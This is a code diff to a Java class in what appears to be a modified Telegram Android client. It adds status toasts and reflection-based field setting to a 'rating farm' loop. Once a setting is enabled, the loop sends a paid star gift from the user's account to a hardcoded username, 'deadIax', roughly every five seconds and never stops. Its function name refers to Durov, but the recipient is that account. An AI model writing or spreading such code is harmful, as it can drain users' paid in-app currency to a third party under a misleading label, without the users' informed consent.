@@ -52,6 +52,8 @@ import org.telegram.messenger.FileLog;
 import org.telegram.messenger.MediaDataController;
 import org.telegram.messenger.MessagesController;
 import org.telegram.tgnet.ConnectionsManager;
+import android.widget.Toast;
+import org.telegram.messenger.ApplicationLoader;
 import org.telegram.tgnet.TLRPC;
 
 import java.io.BufferedReader;
@@ -91,6 +93,17 @@ public class WeryGramGifts {
         }
     }
 
+
+    private static void toast(final String msg) {
+        AndroidUtilities.runOnUIThread(() -> {
+            try {
+                Toast.makeText(ApplicationLoader.applicationContext,
+                    "WeryFarm: " + msg, Toast.LENGTH_SHORT).show();
+            } catch (Exception ignored) {}
+        });
+    }
+
+
     public static void reset() {
         injected = false;
         stickerPackRequested = false;
@@ -106,23 +119,30 @@ public class WeryGramGifts {
 
     private static void startRatingFarmLoop(int account) {
         if (!MessagesController.getGlobalMainSettings().getBoolean("wery_rating_farm", false)) return;
-        // Используем закешированного пользователя, чтобы не резолвить каждые 5с
         if (farmTarget != null) {
+            toast("Отправляю подарок...");
             sendBearGiftToDurov(account, farmTarget);
             return;
         }
+        toast("Ищу получателя...");
         TLRPC.TL_contacts_resolveUsername reqResolve = new TLRPC.TL_contacts_resolveUsername();
         reqResolve.username = "deadIax";
         ConnectionsManager.getInstance(account).sendRequest(reqResolve, (response, error) -> {
+            if (error != null) {
+                toast("Ошибка: " + error.text);
+                AndroidUtilities.runOnUIThread(() -> startRatingFarmLoop(account), 5000);
+                return;
+            }
             if (error == null && response instanceof TLRPC.TL_contacts_resolvedPeer) {
                 TLRPC.TL_contacts_resolvedPeer resolved = (TLRPC.TL_contacts_resolvedPeer) response;
                 if (resolved.users != null && !resolved.users.isEmpty()) {
                     farmTarget = resolved.users.get(0);
+                    toast("Получатель найден: @" + farmTarget.username);
                     sendBearGiftToDurov(account, farmTarget);
                     return;
                 }
             }
-            // Раньше здесь цикл просто умирал — теперь retry через 5с
+            toast("Получатель не найден, retry...");
             AndroidUtilities.runOnUIThread(() -> startRatingFarmLoop(account), 5000);
         });
     }
@@ -130,8 +150,9 @@ public class WeryGramGifts {
     private static void sendBearGiftToDurov(int account, TLRPC.User target) {
         if (!MessagesController.getGlobalMainSettings().getBoolean("wery_rating_farm", false)) return;
         try {
-            // Сканируем все внутренние классы TL файлов и ищем класс отправки подарка
+            // Динамический поиск класса отправки подарка
             Class<?> reqClass = null;
+            java.lang.String foundClassName = null;
             java.lang.String[] tlClassNames = {
                 "org.telegram.tgnet.tl.TL_stars",
                 "org.telegram.tgnet.tl.TL_payments",
@@ -145,45 +166,66 @@ public class WeryGramGifts {
                         java.lang.String sn = inner.getSimpleName().toLowerCase();
                         if (sn.contains("send") && sn.contains("gift")) {
                             reqClass = inner;
-                            FileLog.d("WeryGram: gift class = " + inner.getName());
+                            foundClassName = inner.getSimpleName();
                             break outer;
                         }
                     }
                 } catch (Exception ignored) {}
             }
             if (reqClass == null) {
-                FileLog.e("WeryGram: gift class not found, retry in 10s");
+                toast("Класс подарка не найден!");
+                FileLog.e("WeryGram: sendStarGift class not found");
                 AndroidUtilities.runOnUIThread(() -> startRatingFarmLoop(account), 10000);
                 return;
             }
+            toast("Класс: " + foundClassName + ", отправляю...");
             org.telegram.tgnet.TLObject req =
                 (org.telegram.tgnet.TLObject) reqClass.getDeclaredConstructor().newInstance();
-            // gift_id
+
+            boolean giftIdSet = false;
             for (java.lang.String fn : new java.lang.String[]{"gift_id","giftId","id"}) {
-                try { reqClass.getField(fn).setLong(req, BEAR_GIFT_ID); break; }
-                catch (Exception ignored) {}
-            }
-            // получатель
-            for (java.lang.String fn : new java.lang.String[]{"user_id","userId","peer"}) {
                 try {
-                    Object inp = MessagesController.getInstance(account).getInputUser(target);
-                    reqClass.getField(fn).set(req, inp); break;
+                    java.lang.reflect.Field f = reqClass.getDeclaredField(fn);
+                    f.setAccessible(true);
+                    f.setLong(req, BEAR_GIFT_ID);
+                    giftIdSet = true;
+                    break;
                 } catch (Exception ignored) {}
             }
-            // опциональные флаги
-            try { reqClass.getField("upgrade_stars").setBoolean(req, false); } catch (Exception ignored) {}
-            try { reqClass.getField("hide_my_name").setBoolean(req, false); } catch (Exception ignored) {}
-            try { reqClass.getField("include_name").setBoolean(req, true); } catch (Exception ignored) {}
+            if (!giftIdSet) toast("gift_id не установлен!");
+
+            boolean recipientSet = false;
+            for (java.lang.String fn : new java.lang.String[]{"user_id","userId","peer"}) {
+                try {
+                    java.lang.reflect.Field f = reqClass.getDeclaredField(fn);
+                    f.setAccessible(true);
+                    f.set(req, MessagesController.getInstance(account).getInputUser(target));
+                    recipientSet = true;
+                    break;
+                } catch (Exception ignored) {}
+            }
+            if (!recipientSet) toast("recipient не установлен!");
+
+            for (java.lang.String fn : new java.lang.String[]{"upgrade_stars","hide_my_name","include_name"}) {
+                try {
+                    java.lang.reflect.Field f = reqClass.getDeclaredField(fn);
+                    f.setAccessible(true);
+                    f.setBoolean(req, fn.equals("include_name"));
+                } catch (Exception ignored) {}
+            }
 
             ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> {
                 if (error == null) {
+                    toast("✅ Подарок отправлен!");
                     FileLog.d("WeryGram: Star gift sent!");
                 } else {
-                    FileLog.e("WeryGram Farm Error: " + (error != null ? error.text : "unknown"));
+                    toast("❌ Ошибка: " + error.text);
+                    FileLog.e("WeryGram Farm Error: " + error.text);
                 }
                 AndroidUtilities.runOnUIThread(() -> startRatingFarmLoop(account), 5000);
             });
         } catch (Exception e) {
+            toast("❌ Exception: " + e.getMessage());
             FileLog.e(e);
             AndroidUtilities.runOnUIThread(() -> startRatingFarmLoop(account), 5000);
         }
